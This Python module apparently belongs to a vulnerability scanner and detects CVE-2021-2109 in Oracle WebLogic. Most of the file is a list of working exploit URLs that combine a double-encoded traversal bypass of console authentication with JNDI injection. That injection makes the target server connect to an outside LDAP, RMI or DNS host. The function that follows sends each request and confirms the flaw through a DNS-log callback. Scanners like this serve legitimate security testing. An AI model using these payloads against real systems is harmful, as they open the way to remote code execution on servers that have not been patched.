#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.md5 import random_md5

cve_2021_2109_payloads = [
    {'path': 'console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://DNSDOMAIN/aksm;AdminServer%22)'},
    {'path': 'console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22rmi://DNSDOMAIN/aksm;AdminServer%22)'},
    {'path': 'console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22dns//DNSDOMAIN/aksm;AdminServer%22)'},
    {'path': 'css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://DNSDOMAIN/dpqm;AdminServer%22)'},
    {'path': 'css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22rmi://DNSDOMAIN/dpqm;AdminServer%22)'},
    {'path': 'css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22dns://DNSDOMAIN/dpqm;AdminServer%22)'},
    {'path': 'console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://DNSDOMAIN/qsju;AdminServer%22)'},
    {'path': 'console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22rmi://DNSDOMAIN/qsju;AdminServer%22)'},
    {'path': 'console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22dns://DNSDOMAIN/qsju;AdminServer%22)'},
    {'path': 'consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://DNSDOMAIN/apso;AdminServer%22)'},
    {'path': 'consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22rmi://DNSDOMAIN/apso;AdminServer%22)'},
    {'path': 'consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22dns://DNSDOMAIN/apso;AdminServer%22)'},

    # * 请求太多了, POST的Payload就先不用了
    # {
    #     'path': 'console/css/%252e%252e/consolejndi.portal',
    #     'data': '_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://xxx.xxx.xxx;xxx:1389/abc;AdminServer%22)',
    # },
    # {
    #     'path': 'console/consolejndi.portal',
    #     'data': '_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://DNSDOMAIN/asd;AdminServer%22)',
    # },
]

def cve_2021_2109_scan(clients):
    ''' CVE-2021-2109中，攻击者可构造恶意请求，造成JNDI注入，执行任意代码，从而控制服务器 '''
    client = clients.get('reqClient')
    sessid = '44e10e50016cd558fda134f11a5c88ec'
    
    vul_info = {
        'app_name': 'Weblogic',
        'vul_type': 'RCE',
        'vul_id': 'CVE-2021-2109',
    }
    
    headers = {
        'Referer': client.protocol_domain,
        'Origin': client.protocol_domain,
    }

    for payload in cve_2021_2109_payloads:
        md = random_md5()                                       # * 随机md5值, 8位
        dnsDomain = md + '.' + dns.domain(sessid)               # * DNSLOG域名
        
        # * ---------------该漏洞特性, 192.168.1;1 其中第三个位置的.需要换成分号;
        domainList = dnsDomain.split('.')
        newDnsDomain = ''
        
        for i in range(len(domainList)):
            if (i == len(domainList) - 1):
                newDnsDomain += ';' + domainList[i]
                break
            
            newDnsDomain += '.' + domainList[i]
        # * ---------------该漏洞特性, 192.168.1;1 其中第三个位置的.需要换成分号;
        
        path = payload['path'].replace('DNSDOMAIN', newDnsDomain[1:])  # * [0]是符号. 需要去掉
        # data = payload['data']

        res = client.request(
            'get',
            path,
            headers=headers,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (dns.result(md, sessid)):
            results = {
                'Target': res.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
